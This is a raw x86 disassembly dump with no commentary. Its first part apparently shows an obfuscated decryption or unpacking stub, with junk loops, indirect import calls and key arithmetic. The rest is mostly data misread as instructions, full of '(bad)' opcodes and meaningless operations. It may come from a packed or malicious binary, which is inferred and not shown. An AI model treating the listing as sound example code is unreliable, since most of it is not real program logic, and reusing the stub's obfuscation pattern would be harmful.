  419ec3:	je     0x419f16
  419ec9:	cmp    DWORD PTR ds:0x42b018,0x1f
  419ed0:	jne    0x419efe
  419ed6:	push   0x7696
  419edb:	push   0x42c01c
  419ee0:	push   0x4031
  419ee5:	push   0x429010
  419eea:	push   0x1f96
  419eef:	push   DWORD PTR [ebp-0x18]
  419ef2:	push   DWORD PTR [ebp-0x20]
  419ef5:	push   DWORD PTR [ebp-0x1c]
  419ef8:	call   DWORD PTR ds:0x424018
  419efe:	mov    ecx,DWORD PTR ds:0x42b018
  419f04:	dec    ecx
  419f05:	mov    DWORD PTR ds:0x42b018,ecx
  419f0b:	jmp    0x419ebc
  419f10:	sub    DWORD PTR ds:0x428008,ecx
  419f16:	mov    ecx,DWORD PTR [ebp-0x10]
  419f19:	xor    al,0x6f
  419f1b:	adc    DWORD PTR ds:0x429004,0x428004
  419f25:	sub    al,0xd
  419f27:	mov    BYTE PTR [ecx],al
  419f29:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  419f30:	and    DWORD PTR ds:0x428010,0x0
  419f3a:	jmp    0x419f4c
  419f3f:	mov    ecx,DWORD PTR ds:0x428010
  419f45:	inc    ecx
  419f46:	mov    DWORD PTR ds:0x428010,ecx
  419f4c:	cmp    DWORD PTR ds:0x428010,0x12
  419f53:	jae    0x419f77
  419f59:	cmp    DWORD PTR ds:0x428010,0x22
  419f60:	jne    0x419f71
  419f66:	push   0x80ee
  419f6b:	call   DWORD PTR ds:0x42401c
  419f71:	jmp    0x419f3f
  419f76:	inc    eax
  419f77:	push   ebx
  419f78:	and    DWORD PTR ds:0x428020,0x0
  419f82:	mov    eax,ds:0x428020
  419f87:	inc    eax
  419f88:	mov    ds:0x428020,eax
  419f8d:	cmp    DWORD PTR ds:0x428020,0x21
  419f94:	jne    0x419fa8
  419f9a:	push   0x12b4
  419f9f:	push   DWORD PTR [ebp-0xc]
  419fa2:	call   DWORD PTR ds:0x424020
  419fa8:	cmp    DWORD PTR ds:0x428020,0x16
  419faf:	jb     0x419f82
  419fb5:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  419fbc:	sub    eax,0x5057
  419fc1:	mov    ecx,DWORD PTR [ebp-0x14]
  419fc4:	xor    DWORD PTR ds:0x42a010,0x31a
  419fce:	push   esi
  419fcf:	and    DWORD PTR ds:0x42801c,0x42b000
  419fd9:	mov    eax,0x7510893
  419fde:	xor    ecx,eax
  419fe0:	mov    esi,0x3272db
  419fe5:	push   edi
  419fe6:	add    ecx,esi
  419fe8:	jmp    0x41a00c
  419fed:	mov    DWORD PTR ds:0x428010,0x3a90
  419ff7:	mov    dl,BYTE PTR [ebp-0x1]
  419ffa:	mov    DWORD PTR ds:0x42b000,0x1f96
  41a004:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41a00b:	inc    ecx
  41a00c:	mov    DWORD PTR ds:0x42b008,0x156a
  41a016:	cmp    ecx,0x40
  41a019:	mov    DWORD PTR ds:0x42b004,0x31d2
  41a023:	jb     0x419fed
  41a029:	sbb    edx,DWORD PTR ds:0x429018
  41a02f:	mov    edx,DWORD PTR [ebp-0x14]
  41a032:	dec    DWORD PTR ds:0x428028
  41a038:	xor    edx,eax
  41a03a:	add    edx,esi
  41a03c:	mov    DWORD PTR ds:0x42a00c,0x26bd
  41a046:	jmp    0x41c434
  41a04b:	mov    edi,DWORD PTR [ebp+0x8]
  41a04e:	jmp    0x41c3c9
  41a053:	ud1    esp,DWORD PTR [edx+edi*2-0x78941c5c]
  41a05b:	(bad)  
  41a05c:	mov    ch,0x8f
  41a05e:	std    
  41a05f:	cli    
  41a060:	mov    ds:0x5f76d3,al
  41a065:	popa   
  41a066:	bound  eax,QWORD PTR [edi+ebx*2]
  41a069:	bound  esp,QWORD PTR [edx+0x20]
  41a06c:	inc    BYTE PTR [edx]
  41a06e:	lea    esi,[ebx+eax*2-0x1ff83f77]
  41a075:	das    
  41a076:	inc    edx
  41a077:	add    eax,0x8a0d30b3
  41a07c:	rcr    BYTE PTR [ebx+eax*1-0x8946a34],1
  41a083:	mov    edi,0x20bbf182
  41a088:	in     al,0x6
  41a08a:	lods   eax,DWORD PTR ds:[esi]
  41a08b:	sar    ebx,cl
  41a08d:	(bad)  
  41a08e:	cs leave 
  41a090:	adc    eax,ebx
  41a092:	sub    eax,0x7ee0d037
  41a097:	(bad)  
  41a098:	shl    al,0x53
  41a09b:	out    0xbf,eax
  41a09d:	adc    ah,ch
  41a09f:	bound  edi,QWORD PTR [eax-0x65601de6]
  41a0a5:	call   0x372d566a
  41a0aa:	shl    al,1
  41a0ac:	pop    ebx
  41a0ad:	test   BYTE PTR [ecx+0x78],0x9b
  41a0b1:	adc    BYTE PTR [eax],ah
  41a0b3:	fs inc ebx
  41a0b5:	add    ebx,eax
  41a0b7:	xchg   DWORD PTR [ecx+eiz*2+0x55],eax
  41a0bb:	mov    dh,0x1
  41a0bd:	cmc    
  41a0be:	pop    ebp
  41a0bf:	daa    
  41a0c0:	dec    edi
  41a0c1:	out    dx,eax
  41a0c2:	jle    0x41a0b5
  41a0c4:	mov    ch,0xef
  41a0c6:	mov    edi,DWORD PTR [edi+ebp*4]
  41a0c9:	rcr    DWORD PTR [ecx-0x3f],cl
  41a0cc:	mov    dl,0x33
  41a0ce:	mov    BYTE PTR [eiz*2+0x59cfd4f7],al
  41a0d5:	ret    0x1a5a
  41a0d8:	adc    ecx,DWORD PTR [ebx-0xa]
  41a0db:	nop
  41a0dc:	xchg   edi,eax
  41a0dd:	sar    BYTE PTR [ebp+0x3e],1
  41a0e0:	inc    edi
  41a0e1:	into   
  41a0e2:	pop    edi
  41a0e3:	mov    bh,0x9a
  41a0e5:	test   DWORD PTR [ebp-0x59],esp
  41a0e8:	jno    0x41a0f7
  41a0ea:	das    
  41a0eb:	pop    ecx
  41a0ec:	outs   dx,DWORD PTR ds:[esi]
  41a0ed:	push   esi
  41a0ee:	int    0x98
  41a0f0:	push   esi
  41a0f1:	popf   
  41a0f2:	inc    ebx
  41a0f3:	mov    bh,0x8b
  41a0f5:	and    ecx,DWORD PTR [edx+0x160a9383]
  41a0fb:	cmp    dh,BYTE PTR [edi+esi*1]
  41a0fe:	test   ebp,eax
  41a100:	pop    ss
  41a101:	jecxz  0x41a0d4
  41a103:	scas   al,BYTE PTR es:[edi]
  41a104:	and    DWORD PTR [eax],ecx
  41a106:	out    dx,al
  41a107:	es hlt 
  41a109:	jmp    0x41a15a
  41a10b:	fsub   QWORD PTR [edx]
  41a10d:	and    ebp,esp
  41a10f:	in     al,0xa2
  41a111:	nop
  41a112:	std    
  41a113:	and    BYTE PTR [ecx+0x28],bh
  41a116:	mov    WORD PTR [eax+0x994fa98],es
  41a11c:	loop   0x41a103
  41a11e:	or     eax,0x3ca32ef3
  41a123:	sahf   
  41a124:	or     DWORD PTR [edx],0x50
  41a127:	popf   
  41a128:	xchg   ebp,edi
  41a12a:	add    bh,BYTE PTR [edx+0x2d8a4775]
  41a130:	sub    ebx,DWORD PTR [edx+0x128c3f09]
  41a136:	arpl   WORD PTR [edi],di
  41a138:	(bad)  
  41a139:	cwde   
  41a13a:	and    BYTE PTR [ebx],ah
  41a13c:	or     eax,0x2bcbe519
  41a141:	xchg   edi,eax
  41a142:	cmp    BYTE PTR [edi],bl
  41a144:	iret   
  41a145:	adc    al,ch
  41a147:	mov    dh,0xa9
  41a14a:	repnz adc DWORD PTR ds:[edi-0x3b],ebx
  41a14f:	test   DWORD PTR ss:[edi-0x27],edx
  41a153:	mov    ebx,0xc13f9323
  41a158:	xor    dh,BYTE PTR [eax]
  41a15a:	and    DWORD PTR [ebp+0x12],ebp
  41a15d:	ret    
  41a15e:	jg     0x41a182
  41a160:	sti    
  41a161:	push   esp
  41a162:	aas    
  41a163:	mov    eax,ds:0x50f7c6ad
  41a168:	fsub   QWORD PTR [esi-0x689369fe]
  41a16e:	and    edx,DWORD PTR [eax-0x8]
  41a171:	not    bl
  41a173:	retf   
  41a174:	pop    edi
  41a175:	dec    ebp
  41a176:	in     eax,dx
  41a177:	cli    
  41a178:	out    0x7c,eax
  41a17a:	cdq    
  41a17b:	(bad)  
  41a17c:	sbb    al,0x4b
  41a17e:	aam    0xb4
  41a180:	jecxz  0x41a10c
  41a182:	add    esp,DWORD PTR [ebx]
  41a184:	ins    BYTE PTR es:[edi],dx
  41a185:	mov    edi,0x1407f90f
  41a18a:	(bad)  
  41a18b:	push   esi
  41a18c:	clc    
  41a18d:	xor    BYTE PTR ds:[edx+0x7a71789d],ah
  41a194:	popa   
  41a195:	push   0xf
  41a197:	mov    esp,0x5863528c
  41a19c:	mov    DWORD PTR [edx+0x27516d2a],ecx
  41a1a2:	jl     0x41a17c
  41a1a4:	out    0x3e,al
  41a1a6:	adc    al,0xca
  41a1a8:	adc    BYTE PTR [edi],ah
  41a1aa:	cwde   
  41a1ab:	mov    bl,BYTE PTR [ebp-0x7f2213ac]
  41a1b1:	push   0xd8126301
  41a1b6:	clc    
  41a1b7:	jle    0x41a18a
  41a1b9:	xor    DWORD PTR [edx+0x52],ecx
  41a1bc:	pop    edx
  41a1bd:	sub    BYTE PTR [ebp-0x25],0x32
  41a1c1:	xor    BYTE PTR [ecx+edi*8-0x3c],0x0
  41a1c6:	xor    eax,0x7f3b7cf6
  41a1cb:	sti    
  41a1cc:	hlt    
  41a1cd:	sbb    ebp,DWORD PTR [edi-0x33]
  41a1d0:	pop    ds
  41a1d1:	retf   0x2896
  41a1d4:	lods   eax,DWORD PTR ds:[esi]
  41a1d5:	cmp    DWORD PTR [esi],0x20
  41a1d8:	hlt    
  41a1d9:	in     al,0x19
  41a1db:	inc    ebp
  41a1dc:	loop   0x41a202
  41a1de:	call   0x82a4:0xc885b3c1
  41a1e5:	xchg   ah,ah
  41a1e7:	lock fsubr DWORD PTR [ecx+eax*1-0x67f0886d]
  41a1ef:	xchg   BYTE PTR [eax],dl
  41a1f1:	in     al,0x49
  41a1f3:	scas   eax,DWORD PTR es:[edi]
  41a1f4:	or     esi,esp
  41a1f6:	outs   dx,DWORD PTR ds:[esi]
  41a1f7:	ror    DWORD PTR [ebx+0x55],cl
  41a1fa:	pop    ebx
  41a1fb:	fstp   QWORD PTR [eax+0x4b]
  41a1fe:	push   0x6c
  41a200:	mov    eax,0x14177c03
  41a205:	(bad)  
  41a207:	lock push edx
  41a209:	js     0x41a1cd
  41a20b:	ror    DWORD PTR [edx+0x51],cl
  41a20e:	add    ch,BYTE PTR [edi]
  41a210:	cmp    eax,0xd0f69784
  41a215:	das    
  41a216:	push   esp
  41a217:	jl     0x41a19f
  41a219:	sbb    dh,BYTE PTR [ebp-0x2a]
  41a21c:	clc    
  41a21d:	push   edx
  41a21e:	scas   eax,DWORD PTR es:[edi]
  41a21f:	sub    al,BYTE PTR [edi-0x2]
  41a222:	inc    esi
  41a223:	stc    
  41a224:	les    edi,FWORD PTR [ebx+edx*8]
  41a227:	lea    edx,[esi-0x7d93bc78]
  41a22d:	inc    ecx
  41a22e:	add    bh,BYTE PTR [ebx]
  41a230:	daa    
  41a231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a232:	out    dx,eax
  41a233:	sub    BYTE PTR [edi-0x39f37a57],ch
  41a239:	stc    
  41a23a:	fimul  DWORD PTR [edi+0x1796d471]
  41a240:	mov    esi,0x94057faa
  41a245:	xchg   esp,eax
  41a246:	fidiv  WORD PTR [ebx-0x1dc4b732]
  41a24c:	jecxz  0x41a208
  41a24e:	or     ebp,DWORD PTR [esi-0x7c]
  41a251:	mul    BYTE PTR [ebx]
  41a253:	mov    eax,gs:0x114e25b7
  41a259:	(bad)  
  41a25a:	jb     0x41a200
  41a25c:	push   0xffffff85
  41a25e:	xor    DWORD PTR es:[edi+0xa],esi
  41a262:	pusha  
  41a263:	aas    
  41a264:	jmp    0x4787db2a
  41a269:	lock sbb eax,0xb3c999dd
  41a26f:	int3   
  41a270:	stc    
  41a271:	call   0xbc13:0x2b2a7eb9
  41a278:	mov    ch,0xd5
  41a27a:	rcl    DWORD PTR [eax+edx*2-0x4c],1
  41a27e:	push   ecx
  41a27f:	mov    ebp,DWORD PTR ds:0x7e6e4071
  41a285:	push   ebx
  41a286:	imul   edx,ebx,0xd2f9e2a6
  41a28c:	out    dx,eax
  41a28d:	sub    DWORD PTR [edx],esp
  41a28f:	daa    
  41a290:	das    
  41a291:	fcom   st(2)
  41a293:	and    bl,BYTE PTR [esi]
  41a295:	repnz aas 
  41a297:	sbb    al,0x47
  41a299:	inc    ebx
  41a29a:	jmp    0x220fd630
  41a29f:	rcr    DWORD PTR [ecx],cl
  41a2a1:	jnp    0x41a2eb
  41a2a3:	pop    ebx
  41a2a4:	jno    0x41a244
  41a2a6:	pop    ebp
  41a2a7:	js     0x41a2ae
  41a2a9:	cli    
  41a2aa:	daa    
  41a2ab:	jmp    0x87a7f96d
  41a2b0:	stos   DWORD PTR es:[edi],eax
  41a2b1:	shl    DWORD PTR [esi-0x32ee5305],cl
  41a2b7:	jecxz  0x41a2f0
  41a2b9:	lods   al,BYTE PTR ds:[esi]
  41a2ba:	sub    al,0xbd
  41a2bc:	shl    BYTE PTR [eax],0xd8
  41a2bf:	xchg   DWORD PTR [ebp+0x2e9091dc],ecx
  41a2c5:	stc    
  41a2c6:	inc    BYTE PTR [esi-0x42]
  41a2c9:	jb     0x41a2d5
  41a2cb:	mov    ds:0x4f3edd7e,al
  41a2d0:	jp     0x41a26d
  41a2d2:	xchg   ebp,eax
  41a2d3:	jnp    0x41a2ba
  41a2d5:	inc    esi
  41a2d6:	lahf   
  41a2d7:	jge    0x41a276
  41a2d9:	sub    eax,0x106ee522
  41a2de:	push   edx
  41a2df:	addr16 out 0xb5,al
  41a2e2:	push   ebp
  41a2e3:	jge    0x41a2ae
  41a2e5:	test   al,0x5a
  41a2e7:	dec    esi
  41a2e8:	jp     0x41a2dc
  41a2ea:	or     ecx,DWORD PTR [esi]
  41a2ec:	hlt    
  41a2ed:	shl    edx,cl
  41a2ef:	test   DWORD PTR [edi-0x1834dcab],ebx
  41a2f5:	xor    eax,0x32f7f4bf
  41a2fa:	sub    al,0x98
  41a2fc:	pop    esi
  41a2fd:	pop    ds
  41a2fe:	and    al,dl
  41a300:	mov    cl,0x60
  41a302:	test   DWORD PTR [ebx-0x4f],eax
  41a305:	inc    esp
  41a306:	dec    edx
  41a307:	or     eax,0x90da0e7b
  41a30c:	sub    ah,ah
  41a30e:	retf   
  41a30f:	xor    ah,BYTE PTR [esi-0x6d]
  41a312:	test   al,0xc
  41a314:	jnp    0x41a301
  41a316:	repnz add DWORD PTR [edi-0x33d9936c],esp
  41a31d:	(bad)  
  41a31e:	and    edx,DWORD PTR [ebp+0x1bf77dbe]
  41a324:	repnz test eax,0x48ecd68b
  41a32a:	int3   
  41a32b:	test   dh,cl
  41a32d:	inc    esi
  41a32e:	loop   0x41a30e
  41a330:	(bad)
  41a333:	xchg   al,ah
  41a335:	mov    dl,0x3
  41a337:	cs (bad) 
  41a339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a33a:	xor    DWORD PTR [ebp+0x4a47dab3],0xfffffff1
  41a341:	iret   
  41a342:	(bad)  
  41a343:	stc    
  41a344:	fs xor al,0xec
  41a347:	ja     0x41a2e1
  41a349:	loope  0x41a305
  41a34b:	push   ss
  41a34c:	bound  ebp,QWORD PTR [eax*4+0x6219a22]
  41a353:	iret   
  41a354:	adc    ch,BYTE PTR [esi-0x3be1eaef]
  41a35a:	inc    ecx
  41a35b:	fmul   DWORD PTR [ecx+0x43]
  41a35e:	and    DWORD PTR [edi+0x24],edx
  41a361:	ja     0x41a2ef
  41a363:	dec    ebp
  41a364:	push   edx
  41a365:	je     0x41a348
  41a367:	jno    0x41a3e8
  41a369:	gs push eax
  41a36b:	rol    dh,1
  41a36d:	mov    al,ds:0xb1a45b52
  41a372:	rcr    DWORD PTR ds:0x984401a2,1
  41a378:	ds pop edi
  41a37a:	fcmovnbe st,st(2)
  41a37c:	cmp    DWORD PTR [ebx+ebx*4+0xf],esp
  41a380:	xlat   BYTE PTR ds:[ebx]
  41a381:	mov    cl,0xc1
  41a383:	(bad)  
  41a384:	dec    edi
  41a385:	fcomp  DWORD PTR [ebp+0x6438d9d]
  41a38b:	fdivr  st,st(4)
  41a38d:	das    
  41a38e:	mov    ds:0x509c72dd,eax
  41a393:	lea    edx,[edx-0xf]
  41a396:	push   esi
  41a397:	adc    eax,0x3b16f630
  41a39c:	inc    edx
  41a39d:	adc    DWORD PTR [ecx],edx
  41a39f:	xor    esp,DWORD PTR [ebp+0x30]
  41a3a2:	mov    esp,0x3a837989
  41a3a7:	push   ebp
  41a3a8:	test   DWORD PTR [ebp+0x6a],0x3f543c5a
  41a3af:	mov    ch,0x3b
  41a3b1:	nop
  41a3b2:	push   ds
  41a3b3:	xor    bl,BYTE PTR [ecx-0x4]
  41a3b6:	gs dec esi
  41a3b8:	xchg   edi,eax
  41a3b9:	adc    dl,bl
  41a3bb:	lahf   
  41a3bc:	sahf   
  41a3bd:	cmp    al,0x9
  41a3bf:	jecxz  0x41a34a
  41a3c1:	repz ret 
  41a3c3:	cmc    
  41a3c4:	cmp    al,0xa8
  41a3c6:	sar    edi,1
  41a3c8:	fcom   st(0)
  41a3ca:	mov    edi,0xfdbf49b1
  41a3cf:	fdivr  DWORD PTR [edi-0x1e6e1dcd]
  41a3d5:	adc    eax,0xcb9eac1e
  41a3da:	inc    ecx
  41a3db:	(bad)  
  41a3dc:	fwait
  41a3dd:	cs sub bl,bl
  41a3e0:	repnz mov al,0xd3
  41a3e3:	inc    eax
  41a3e4:	lahf   
  41a3e5:	fdivr  st(7),st
  41a3e7:	inc    ebp
  41a3e8:	call   0x49102602
  41a3ed:	mov    al,0x84
  41a3ef:	and    DWORD PTR [ebp-0x52],eax
  41a3f2:	nop
  41a3f3:	xor    esi,DWORD PTR [esi+0x67]
  41a3f6:	adc    eax,0x4b598cdd
  41a3fb:	push   ebx
  41a3fc:	push   esi
  41a3fd:	sbb    ch,BYTE PTR [ecx-0x70]
  41a400:	xor    cl,al
  41a402:	(bad)  
  41a403:	jbe    0x41a393
  41a405:	imul   edi,DWORD PTR [edx],0x36e05ec9
  41a40b:	and    eax,0xc1b892a5
  41a410:	fs push esi
  41a412:	add    BYTE PTR [eax-0x46463cf0],cl
  41a418:	lds    edi,FWORD PTR [esi]
  41a41a:	rol    DWORD PTR [esi-0x71a13359],cl
  41a420:	(bad)  
  41a421:	xor    BYTE PTR [esi-0x529ff52],ch
  41a427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a428:	dec    ecx
  41a429:	sahf   
  41a42a:	in     al,dx
  41a42b:	inc    edi
  41a42c:	jno    0x41a45d
  41a42e:	adc    eax,DWORD PTR [edx-0x332bae30]
  41a434:	cmp    eax,0xf1604f82
  41a439:	leave  
  41a43a:	push   0x6db3f158
  41a43f:	sub    ecx,0x3b00cba
  41a445:	in     al,dx
  41a446:	imul   BYTE PTR [ecx+0x241b0930]
  41a44c:	imul   esp,esp,0xc1f9f4a0
  41a452:	ins    DWORD PTR es:[edi],dx
  41a453:	rcl    BYTE PTR [ecx-0x2c],1
  41a456:	sbb    DWORD PTR [edi-0x2],eax
  41a459:	adc    eax,0xbc8f92b3
  41a45e:	cmp    edi,edi
  41a460:	xor    eax,0xc8e69a6f
  41a465:	ret    
  41a466:	(bad)  
  41a467:	leave  
  41a468:	in     al,0x73
  41a46a:	add    edi,DWORD PTR [eax+eax*1-0x5e]
  41a46e:	test   DWORD PTR [eax+0xa],esi
  41a471:	push   eax
  41a472:	mov    edx,DWORD PTR [edi-0x278c65b9]
  41a478:	sbb    bh,BYTE PTR [edx-0x79c173b7]
  41a47e:	in     al,dx
  41a47f:	mov    eax,ds:0x2bafc25f
  41a484:	daa    
  41a485:	push   ebx
  41a486:	sub    eax,0x2aeb9494
  41a48b:	pop    ds
  41a48c:	rcl    DWORD PTR [ebx],1
  41a48e:	sub    ah,cl
  41a490:	sub    BYTE PTR [ecx+ebp*1+0x410bfb5b],cl
  41a497:	jmp    0x41a441
  41a499:	inc    esp
  41a49a:	mov    al,0xf1
  41a49c:	add    BYTE PTR [edi+0xf12b07f],dh
  41a4a2:	ins    BYTE PTR es:[edi],dx
  41a4a3:	sub    BYTE PTR [edi+0x33366b7b],cl
  41a4a9:	in     eax,dx
  41a4aa:	push   esp
  41a4ab:	add    BYTE PTR [ebp-0x63d41b7b],dh
  41a4b1:	fs stos BYTE PTR es:[edi],al
  41a4b3:	jb     0x41a514
  41a4b5:	and    BYTE PTR [ebp+ebx*2-0x1ee4718b],cl
  41a4bc:	neg    DWORD PTR [esi]
  41a4be:	push   edi
  41a4bf:	out    dx,eax
  41a4c0:	shl    DWORD PTR [ebx-0x2e1be5ed],cl
  41a4c6:	inc    eax
  41a4c7:	cdq    
  41a4c8:	test   BYTE PTR [edi-0x41],bl
  41a4cb:	pop    ebx
  41a4cc:	aad    0xd0
  41a4ce:	addr16 xchg esp,eax
  41a4d0:	mov    ecx,0x11e12f87
  41a4d5:	loopne 0x41a4c4
  41a4d7:	mov    edx,0xeb329c3c
  41a4dc:	sub    DWORD PTR [edi+ebx*1],0x2f
  41a4e0:	std    
  41a4e1:	cmp    edx,DWORD PTR [ebx+0x203d7059]
  41a4e7:	xor    ebx,ecx
  41a4e9:	in     eax,0x24
  41a4eb:	sub    BYTE PTR [esi],dh
  41a4ed:	mov    al,ds:0x9e861bc0
  41a4f2:	imul   DWORD PTR [ebp+0x67]
  41a4f5:	lock daa 
  41a4f7:	mov    ?,WORD PTR [esi]
  41a4f9:	je     0x41a504
  41a4fb:	sub    eax,DWORD PTR [ecx+0xd0fc97d]
  41a501:	push   es
  41a502:	jnp    0x41a559
  41a504:	push   ebp
  41a505:	add    al,BYTE PTR ds:0x489498da
  41a50b:	or     al,0x2
  41a50d:	mov    eax,0x3762ac65
  41a512:	xlat   BYTE PTR ds:[ebx]
  41a513:	inc    edi
  41a514:	xor    al,0xd8
  41a516:	pop    ebx
  41a517:	aas    
  41a518:	rol    BYTE PTR [edi+0x1db4cc6d],1
  41a51e:	jecxz  0x41a4a2
  41a520:	and    al,0x77
  41a522:	mov    ebp,0xe8afb858
  41a527:	int3   
  41a528:	sub    eax,0x22f8179d
  41a52d:	push   ecx
  41a52e:	test   BYTE PTR [edi+ebp*8],bl
  41a531:	adc    ecx,esp
  41a533:	fstp   QWORD PTR [edi]
  41a535:	xchg   ecx,eax
  41a536:	int3   
  41a537:	sbb    dl,BYTE PTR [esi]
  41a539:	jnp    0x41a58c
  41a53b:	push   edi
  41a53c:	and    edi,ebx
  41a53e:	out    dx,al
  41a53f:	push   esp
  41a540:	push   ebx
  41a541:	inc    ebx
  41a542:	jnp    0x41a4e8
  41a544:	ror    esp,cl
  41a546:	pushf  
  41a547:	outs   dx,DWORD PTR ds:[esi]
  41a548:	cmp    al,0xf8
  41a54a:	mov    eax,0xfbe26c74
  41a54f:	or     BYTE PTR [esi+0x58561c57],dh
  41a555:	cmp    eax,0x620d33c4
  41a55a:	adc    ebp,DWORD PTR [edx]
  41a55c:	adc    BYTE PTR [eax+0x180da87e],0x35
  41a563:	aaa    
  41a564:	out    dx,eax
  41a565:	leave  
  41a566:	clc    
  41a567:	and    BYTE PTR [ebp-0x47],0xfd
  41a56b:	sbb    ch,BYTE PTR [esp+ebx*1+0x3c]
  41a56f:	cmp    DWORD PTR [ebx-0x2c],edi
  41a572:	and    ch,0xa1
  41a575:	pop    ecx
  41a576:	or     ebp,DWORD PTR [ebx-0x35]
  41a579:	in     eax,0xc3
  41a57b:	mov    ds:0x856688a1,eax
  41a580:	out    0x4a,eax
  41a582:	jae    0x41a589
  41a584:	pop    ds
  41a585:	je     0x41a5d0
  41a587:	fild   QWORD PTR [edx-0x35]
  41a58a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a58b:	pop    edi
  41a58c:	mov    ch,0x27
  41a58e:	push   ds
  41a58f:	dec    esi
  41a590:	mov    edi,0x7fed9fe6
  41a595:	xor    al,BYTE PTR [edx]
  41a597:	adc    esp,esp
  41a599:	(bad)  
  41a59a:	enter  0x8851,0x88
  41a59e:	add    ecx,DWORD PTR [edx-0x420794e6]
  41a5a4:	cmp    eax,0x34b59e36
  41a5a9:	call   0xf84b:0xad4984f
  41a5b0:	arpl   WORD PTR [ebx+0x1fd26605],sp
  41a5b6:	sbb    BYTE PTR gs:[ebx+0xc],dh
  41a5ba:	(bad)  
  41a5bb:	nop
  41a5bc:	or     edi,DWORD PTR [eax-0x19]
  41a5bf:	loop   0x41a5b8
  41a5c1:	adc    eax,0x52654b2b
  41a5c6:	je     0x41a56d
  41a5c8:	adc    eax,0x803fa8a
  41a5cd:	enter  0x13b3,0xf2
  41a5d1:	add    dh,ch
  41a5d3:	xchg   BYTE PTR [ebx+0x14],dh
  41a5d6:	cmp    DWORD PTR [edi-0x3faeca57],eax
  41a5dc:	or     eax,edi
  41a5de:	ret    
  41a5df:	mov    WORD PTR [ecx],gs
  41a5e1:	sub    esi,esp
  41a5e3:	aad    0x73
  41a5e5:	push   esi
  41a5e6:	push   ss
  41a5e7:	int    0x82
  41a5e9:	(bad)  
  41a5ea:	add    bl,ch
  41a5ec:	dec    ebp
  41a5ed:	enter  0xcf5,0x89
  41a5f1:	jo     0x41a5aa
  41a5f3:	cwde   
  41a5f4:	call   0x5f45b56c
  41a5f9:	(bad)  
  41a5fa:	mov    esp,ebp
  41a5fc:	cs ja  0x41a62f
  41a5ff:	call   0x9ef0c400
  41a604:	mov    DWORD PTR [ebx-0x77906b54],eax
  41a60a:	(bad)  
  41a60b:	and    dl,bl
  41a60d:	cdq    
  41a60e:	mov    bl,0xf3
  41a610:	xor    eax,0x71da1b92
  41a615:	loope  0x41a5d9
  41a617:	inc    ebp
  41a618:	adc    al,0x1a
  41a61a:	div    DWORD PTR [ecx]
  41a61c:	inc    ebx
  41a61e:	jne    0x41a673
  41a620:	adc    eax,0xaf58a73
  41a625:	jge    0x41a5b1
  41a627:	ins    DWORD PTR es:[edi],dx
  41a628:	jo     0x41a644
  41a62a:	in     al,dx
  41a62b:	in     al,0xdc
  41a62d:	pop    ecx
  41a62e:	jmp    0xb2576f52
  41a633:	dec    edi
  41a634:	in     al,0xe8
  41a636:	xchg   ebx,eax
  41a638:	add    al,0x48
  41a63a:	push   edx
  41a63b:	jne    0x41a675
  41a63d:	mov    bl,0xae
  41a63f:	mov    esi,0xe0a343d0
  41a644:	outs   dx,DWORD PTR ds:[esi]
  41a645:	xor    esi,DWORD PTR [edi]
  41a647:	cwde   
  41a648:	cmp    DWORD PTR [edx],edi
  41a64a:	mov    eax,ds:0xea0c2a81
  41a64f:	inc    esi
  41a650:	add    al,0x8f
  41a652:	push   ebx
  41a653:	ins    BYTE PTR es:[edi],dx
  41a654:	shr    BYTE PTR [ebp+0x40],0xd1
  41a658:	shr    DWORD PTR [esi+edi*8],cl
  41a65b:	iret   
  41a65c:	hlt    
  41a65d:	mov    esp,gs
  41a65f:	mov    al,BYTE PTR [edi]
  41a661:	xchg   ebp,edx
  41a663:	dec    esp
  41a664:	xchg   edx,eax
  41a665:	ss jmp 0x41a605
  41a668:	int    0x54
  41a66a:	ins    BYTE PTR es:[edi],dx
  41a66b:	add    al,0x21
  41a66d:	and    BYTE PTR [ecx-0x26a18cd4],ch
  41a673:	mov    al,bl
  41a675:	ror    dh,0x31
  41a678:	inc    edi
  41a679:	imul   ebx,DWORD PTR [esi-0x5ff4ef0d],0xcc141d5d
  41a683:	test   eax,0x41ea439d
  41a688:	mov    esi,0xe8b16d28
  41a68d:	inc    esp
  41a68e:	aaa    
  41a68f:	jo     0x41a689
  41a691:	sahf   
  41a692:	cmp    dl,cl
  41a694:	ins    DWORD PTR es:[edi],dx
  41a695:	cdq    
  41a696:	add    edx,DWORD PTR [ecx]
  41a698:	cli    
  41a699:	cli    
  41a69a:	mov    eax,ds:0x1fcc98f8
  41a69f:	(bad)  
  41a6a0:	cmp    esp,DWORD PTR [ebp+0x3]
  41a6a3:	cmc    
  41a6a4:	mov    ebx,es
  41a6a6:	aas    
  41a6a7:	stc    
  41a6a8:	xor    ecx,DWORD PTR [ecx-0x2f23bb8d]
  41a6ae:	or     al,0xa7
  41a6b0:	(bad)  
  41a6b1:	hlt    
  41a6b2:	fimul  WORD PTR [ebx+0x5cf9ffb0]
  41a6b8:	ficomp DWORD PTR [eax-0x1257507f]
  41a6be:	(bad)  
  41a6bf:	mov    ebp,0xbc26a76e
  41a6c4:	mov    eax,ds:0x22936965
  41a6c9:	popf   
  41a6ca:	test   BYTE PTR [eax],al
  41a6cc:	fimul  WORD PTR [ebx+0x71]
  41a6cf:	push   ebp
  41a6d0:	outs   dx,DWORD PTR ds:[esi]
  41a6d1:	and    BYTE PTR [esi-0x455d88f3],bl
  41a6d7:	icebp  
  41a6d8:	push   0x67
  41a6da:	ss test bh,dh
  41a6dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6de:	sahf   
  41a6df:	pop    eax
  41a6e0:	adc    ebx,ebp
  41a6e2:	jmp    0x5278:0xad9b620e
  41a6e9:	push   edi
  41a6ea:	inc    ecx
  41a6eb:	or     eax,0xf393df68
  41a6f0:	repnz and DWORD PTR ss:[ebx-0x38],eax
  41a6f5:	mov    dh,0x31
  41a6f7:	sub    eax,DWORD PTR [edx]
  41a6f9:	mov    cl,BYTE PTR [eax+0x41]
  41a6fc:	jns    0x41a6b5
  41a6fe:	push   eax
  41a6ff:	mov    esp,0x67b25ac5
  41a704:	sub    al,0x34
  41a706:	arpl   WORD PTR [eax-0x3ecbd90e],bx
  41a70c:	stc    
